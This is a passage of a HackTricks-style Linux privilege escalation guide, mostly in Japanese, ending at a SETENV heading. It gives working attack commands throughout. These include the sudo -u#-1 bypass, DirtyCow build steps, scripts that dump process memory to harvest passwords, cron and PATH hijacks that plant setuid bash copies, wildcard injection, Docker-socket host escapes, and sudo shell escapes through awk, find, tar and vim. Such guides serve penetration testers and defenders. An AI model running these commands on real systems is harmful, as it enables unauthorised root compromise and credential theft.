# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS 情報

実行中の OS に関する情報を収集しましょう。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

もし**`PATH` 変数内の任意のフォルダに書き込み権限がある場合**、いくつかの libraries や binaries を hijack できる可能性があります:
```bash
echo $PATH
```
### 環境情報

環境変数に興味深い情報、パスワード、あるいはAPIキーは含まれていますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

カーネルのバージョンを確認し、escalate privileges に使用できる exploit があるか確認する
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
脆弱なカーネルの良いリストと、既に **compiled exploits** があるものは以下で見つけられます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
他に **compiled exploits** を見つけられるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのサイトから全ての脆弱なカーネルバージョンを抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
カーネルのエクスプロイトを検索するのに役立つツール：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim、kernel 2.x 向けの exploit のみをチェック)

常に **Google でカーネルバージョンを検索** してください。場合によってはあなたのカーネルバージョンが既存の kernel exploit に記載されており、その場合はその exploit が有効であると確信できます。

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo バージョン

以下に表示される脆弱な sudo バージョンに基づいて:
```bash
searchsploit sudo
```
この grep を使って sudo のバージョンが脆弱かどうか確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

提供: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg の署名検証に失敗

**smasher2 box of HTB** を確認して、この vuln がどのように悪用され得るかの **例** を参照してください
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらにシステムの列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 考えられる防御策の列挙

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

もし docker container の中にいるなら、そこから脱出を試みることができます：

{{#ref}}
docker-security/
{{#endref}}

## ドライブ

**何がマウントされていて何がアンマウントされているか**、どこにあり、なぜかを確認してください。もし何かがアンマウントされているなら、それをマウントして機密情報がないか確認してみてください。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**コンパイラがインストールされているか**確認してください。これは、いくつかの kernel exploit を使う必要がある場合に有用です。実際に使用するマシン（またはそれに近いマシン）でコンパイルすることが推奨されます。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### インストールされている脆弱なソフトウェア

インストールされているパッケージやサービスの**バージョン**を確認してください。例えば古い Nagios バージョンなどがあり、権限昇格のために悪用される可能性があります…\
より疑わしいインストール済みソフトウェアのバージョンは手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
もしマシンにSSHでアクセスできるなら、マシン内にインストールされている古い、または脆弱なソフトウェアを確認するために **openVAS** を使うこともできます。

> [!NOTE] > _これらのコマンドはほとんど役に立たない大量の情報を表示することが多いため、インストールされているソフトウェアのバージョンが既知の exploits に対して脆弱かどうかをチェックする、OpenVAS のようなアプリケーションの使用が推奨されます。_

## Processes

実行されている**プロセス**を確認し、どのプロセスが本来あるべき権限より多くの権限を持っているかをチェックしてください（例えば root によって実行されている tomcat など）。
```bash
ps aux
ps -ef
top -n 1
```
常に[**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md) を確認してください。**Linpeas**はプロセスのコマンドライン内の`--inspect`パラメータをチェックしてそれらを検出します。\
また、**check your privileges over the processes binaries** を確認してください。もしかすると誰かを上書きできるかもしれません。

### プロセス監視

プロセスを監視するために [**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使用できます。これにより、脆弱なプロセスが頻繁に実行されている場合や、特定の条件が満たされたときに実行されるプロセスを特定するのに非常に役立ちます。

### プロセスのメモリ

一部のサーバサービスはメモリ内に**credentialsをプレーンテキストで保存**していることがあります。\
通常、他のユーザーに属するプロセスのメモリを読むには**root privileges**が必要なため、これは通常すでにrootであり、さらに資格情報を発見したいときにより有用です。\
ただし、通常ユーザーとして自分が所有するプロセスのメモリは読むことができることを忘れないでください。

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

たとえば FTP サービスのメモリにアクセスできる場合、Heap を取得してその中の資格情報を検索できます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

指定したプロセスIDに対して、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマップされているかを示します**。また、**各マッピング領域の権限**（permissions）も表示します。**mem** 擬似ファイルは **プロセスのメモリ自体を露出します**。**maps** ファイルから、どの **メモリ領域が読み取り可能**（memory regions are readable）かとそのオフセットが分かります。この情報を使って、**mem ファイル内を seek して読み取り可能な領域をすべて dump してファイルに保存します**。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの**物理メモリ**にアクセスし、仮想メモリにはアクセスしません。カーネルの仮想アドレス空間には /dev/kmem を使用してアクセスできます.\
通常、`/dev/mem` は **root** と **kmem** グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump (linux向け)

ProcDumpは、Windows向けのSysinternalsスイートに含まれる古典的なProcDumpツールをLinux向けに再構想したものです。入手先: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをダンプするには、次を使用できます:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_手動でroot要件を削除し、あなたが所有するプロセスをダンプできます
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root が必要です)

### プロセスメモリからの資格情報

#### 手動の例

authenticator プロセスが実行されている場合:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスをdumpして（プロセスのmemoryをdumpするさまざまな方法は前のセクションを参照）メモリ内のcredentialsを検索できます:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

ツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、**メモリから平文の資格情報を盗み**、いくつかの**既知のファイル**からも盗みます。正しく動作させるにはroot権限が必要です。

| 機能                                              | プロセス名            |
| ------------------------------------------------- | -------------------- |
| GDM パスワード (Kali Desktop, Debian Desktop)     | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## スケジュールされた/Cron jobs

スケジュールされたジョブに脆弱性がないか確認する。root によって実行されるスクリプトを利用できるかもしれない（wildcard vuln? root が使うファイルを変更できるか? symlinks を使う? root が使うディレクトリに特定のファイルを作成する?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron パス

例えば、_/etc/crontab_ の中に以下の PATH が見つかります: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_user が /home/user に対して書き込み権限を持っていることに注意してください_)

もしこの crontab の中で root が PATH を設定せずにコマンドやスクリプトを実行しようとした場合。例えば: _\* \* \* \* root overwrite.sh_\
すると、次のようにして root shell を取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron がワイルドカードを含むスクリプトを使用する場合 (Wildcard Injection)

もしスクリプトが root によって実行され、そのコマンド内に “**\***” が含まれている場合、これを悪用して予期しないこと（例えば privesc）を引き起こすことができます。例:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**ワイルドカードが次のようなパスの直後にある場合** _**/some/path/\***_ **、脆弱ではありません（** _**./\***_ **も同様です）。**

より多くの wildcard exploitation tricks については、次のページを参照してください：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Cron script overwriting and symlink

root によって実行される **cron script を変更できる** なら、簡単に shell を取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root によって実行される script が **directory where you have full access** を使用している場合、そのフォルダを削除して、あなたが制御するスクリプトを配置する別の場所に **create a symlink folder to another one** することが有効かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 頻繁な cron jobs

プロセスを監視して、1分、2分、または5分ごとに実行されているプロセスを探すことができます。これを利用してescalate privilegesできるかもしれません。

例えば、**1分間、0.1秒ごとに監視し**、**実行回数の少ない順にソートし**、最も多く実行されたコマンドを削除するには、次のようにします:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**また** [**pspy**](https://github.com/DominicBreuker/pspy/releases) を使用できます（開始されるすべてのプロセスを監視して一覧表示します）。

### 見えない cron jobs

コメントの後に**キャリッジリターンを入れる**（改行文字なし）ことでcronjobを作成でき、cron jobは動作します。例（キャリッジリターン文字に注意）:
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込みできるか確認してください。書き込み可能であれば、**それを変更して**、**実行する** あなたの **backdoorを** サービスが**起動**、**再起動**または**停止**したときに実行させるようにできます（マシンを再起動するまで待つ必要があるかもしれません）。\
例えば、.service ファイル内にあなたの backdoor を作成し、**`ExecStart=/tmp/script.sh`** のように設定します。

### 書き込み可能なサービスバイナリ

念のため、**write permissions over binaries being executed by services** を持っている場合、それらを backdoors に置き換えることができ、サービスが再実行されたときに backdoors が実行されます。

### systemd PATH - 相対パス

次のコマンドで **systemd** が使用する PATH を確認できます:
```bash
systemctl show-environment
```
パス内のいずれかのフォルダに**書き込み**できることが分かった場合、**escalate privileges** が可能な場合があります。次のようなサービス設定ファイルで**相対パスが使用されている**箇所を検索する必要があります:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、書き込み可能な systemd PATH フォルダ内に、相対パスのバイナリと同じ名前の **executable** を作成してください。サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）を実行するよう要求されたとき、あなたの **backdoor will be executed**。（通常、権限のないユーザはサービスを start/stop できませんが、`sudo -l` が使えるか確認してください。）

**サービスについては `man systemd.service` を参照してください。**

## **タイマー**

**タイマー** は名前が `**.timer**` で終わる systemd の unit ファイルで、`**.service**` ファイルやイベントを制御します。**タイマー** はカレンダー時刻イベントや単調時間イベントのサポートを内蔵しており、cron の代替として非同期に実行できます。

すべてのタイマーは次のコマンドで列挙できます:
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

タイマーを変更できる場合、systemd.unit の既存のユニット（例えば `.service` や `.target`）を実行させることができます。
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> このタイマーが満了したときに有効化される Unit。引数はサフィックスが ".timer" でない unit 名です。指定しない場合、この値はタイマー unit と同じ名前（サフィックスを除く）を持つ service にデフォルトされます（上記参照）。有効化される unit 名とタイマー unit の unit 名は、サフィックス以外同一の名前にすることが推奨されます。

Therefore, to abuse this permission you would need to:

- systemd unit（例えば `.service`）のうち **書き込み可能なバイナリを実行している** ものを見つける
- 相対パスで**実行している** systemd unit を見つけ、実行ファイルを偽装するために **systemd PATH** に対して**書き込み権限**を持っていること

**Learn more about timers with `man systemd.timer`.**

### **タイマーの有効化**

タイマーを有効化するには root 権限が必要で、次のコマンドを実行します:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意: **timer** は `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` にシンボリックリンクを作成することで **有効化されます**

## Sockets

Unix Domain Sockets (UDS) はクライアント-サーバモデル内で同一または別のマシン間の **プロセス間通信** を可能にします。これらは標準的な Unix ディスクリプタファイルを利用してコンピュータ間通信を行い、`.socket` ファイルを通じて設定されます。

Sockets は `.socket` ファイルを使って設定できます。

**sockets については `man systemd.socket` を参照してください。** このファイル内で、いくつか興味深いパラメータを設定できます:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは異なりますが、要約としてソケットが **どこでリッスンするかを示す** ために使われます（AF_UNIX ソケットファイルのパス、リッスンする IPv4/6 および/またはポート番号など）。
- `Accept`: 真偽値を取ります。**true** の場合、**受信ごとにサービスインスタンスが生成され**、接続ソケットのみがそれに渡されます。**false** の場合、すべてのリッスンソケット自体が**起動されたサービスユニットに渡され**、すべての接続に対して単一のサービスユニットが生成されます。この値は、単一のサービスユニットがすべての受信トラフィックを無条件に扱う datagram sockets と FIFOs では無視されます。**デフォルトは false** です。パフォーマンス上の理由から、新しいデーモンは `Accept=no` に適した形でのみ書くことが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1 行以上のコマンドラインを取り、リッスンする **sockets** / FIFOs がそれぞれ **作成され** バインドされる **前** または **後** に実行されます。コマンドラインの最初のトークンは絶対パスでなければならず、その後にプロセスの引数が続きます。
- `ExecStopPre`, `ExecStopPost`: リッスンする **sockets** / FIFOs がそれぞれ **閉じられ** 削除される **前** または **後** に実行される追加の **コマンド** です。
- `Service`: **incoming traffic** に対して **activate** する **service** ユニット名を指定します。この設定は Accept=no の sockets のみ許可されます。デフォルトではソケットと同名のサービス（接尾辞を置換したもの）になります。ほとんどの場合、このオプションを使う必要はありません。

### Writable .socket files

もし **writable** な `.socket` ファイルを見つけたら、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のような行を **追加** できます。そうすると backdoor はソケットが作成される前に実行されます。従って、**おそらくマシンの再起動を待つ必要があります。**\
_システムがそのソケットファイルの設定を使用している必要があり、そうでないと backdoor は実行されません_

### Writable sockets

もし **writable socket** を特定したら（ここでは設定ファイル `.socket` ではなく Unix Sockets の話です）、その socket と **通信でき**、脆弱性を exploit できる可能性があります。

### Unix Sockets を列挙する
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

一部には **sockets listening for HTTP** requests が存在する場合があることに注意してください (_ここで言う .socket ファイルではなく、unix sockets として機能するファイルを指します_)。次のコマンドで確認できます:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
If the socket **HTTPに応答する**場合、**通信**が可能になり、場合によっては**exploit some vulnerability**。

### 書き込み可能な Docker ソケット

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Docker APIを直接使用する**

Docker CLIが利用できない場合でも、Docker socketはDocker APIと`curl`コマンドを使って操作できます。

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

After setting up the `socat` connection, you can execute commands directly in the container with root-level access to the host's filesystem.

### その他

docker socket に対して書き込み権限がある、つまり **group `docker` のメンバーである** 場合、[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) が利用できます。もし [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) であれば、それを悪用して侵害できる可能性もあります。

以下で **more ways to break out from docker or abuse it to escalate privileges** を確認してください:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Busは、アプリケーションが効率的に相互作用しデータを共有できる洗練されたプロセス間通信 (inter-Process Communication, IPC) システムです。モダンなLinuxシステムを念頭に設計されており、さまざまな形態のアプリケーション間通信のための堅牢なフレームワークを提供します。

このシステムは柔軟で、プロセス間のデータ交換を強化する基本的なIPC（enhanced UNIX domain socketsを想起させるもの）をサポートします。さらに、イベントやシグナルのブロードキャストを支援し、システムコンポーネント間の統合を促進します。例えば、着信通話に関するBluetooth daemonからのシグナルが音楽プレーヤーをミュートさせるといったユーザー体験の向上が可能です。加えて、D-Busはリモートオブジェクトシステムをサポートしており、アプリケーション間でのサービス要求やメソッド呼び出しを簡素化し、従来は複雑だった処理を効率化します。

D-Busは**allow/deny model**で動作し、マッチするポリシールールの累積効果に基づいてメッセージ権限（メソッド呼び出し、シグナル送出など）を管理します。これらのポリシーはbusとの相互作用を指定しており、これらの権限を悪用することでprivilege escalationが発生する可能性があります。

例として、`/etc/dbus-1/system.d/wpa_supplicant.conf` にあるそのようなポリシーが挙げられ、rootユーザーが `fi.w1.wpa_supplicant1` を所有し、そのメッセージを送受信するための権限が詳細に記述されています。

ユーザーまたはグループが指定されていないポリシーは全体に適用されます。一方で "default" コンテキストのポリシーは、他の特定のポリシーにカバーされていないすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Busの通信を列挙してエクスプロイトする方法はこちら：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを列挙してマシンの位置を把握するのは常に興味深い。

### 一般的な列挙
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 開いているポート

アクセスする前に、以前にやり取りできなかったマシン上で動作しているネットワークサービスを必ず確認してください:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

sniff trafficができるか確認してください。できれば認証情報を取得できるかもしれません。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

自分が**who**であるか、どの**privileges**を持っているか、システムにどの**users**が存在するか、どのアカウントが**login**できるか、どのアカウントが**root privileges**を持っているかを確認してください：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

一部の Linux バージョンは、**UID > INT_MAX** のユーザーが権限を昇格できるバグの影響を受けていました。More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**悪用するには**: **`systemd-run -t /bin/bash`**

### グループ

root 権限を与える可能性のあるグループの**メンバーかどうか**を確認してください：


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### クリップボード

可能であれば、クリップボード内に興味深いものがないか確認してください
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境の**任意の password を知っている場合は**、その password を使って**各ユーザーにログインしてみてください**。

### Su Brute

大量のノイズを出すことを気にせず、`su` と `timeout` バイナリがマシンに存在するなら、[su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は `-a` パラメータでユーザーを brute-force することも試みます。

## Writable PATH abuses

### $PATH

もし **$PATH のいずれかのフォルダに書き込める** ことが分かった場合、権限を昇格できる可能性があります。具体的には、**書き込み可能なフォルダ内に backdoor を作成する**（理想的には別ユーザー、root が実行するコマンドと同じ名前にする）ことで、該当コマンドが**$PATH 上であなたの書き込み可能フォルダより前にあるフォルダから読み込まれない**ことを利用します。

### SUDO and SUID

sudo を使って実行できるコマンドが許可されているか、またはファイルに suid ビットが設定されている可能性があります。次のコマンドで確認してください:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
いくつかの**意外なコマンドは、ファイルの読み書きやコマンドの実行を可能にします。** 例えば:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo の設定によっては、ユーザーがパスワードを知らなくても他のユーザーの権限でコマンドを実行できることがある。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー `demo` が `root` として `vim` を実行できます。rootディレクトリに ssh key を追加するか、`sh` を呼び出すことで容易にシェルを取得できます。
```
sudo vim -c '!sh'
```
### SETENV

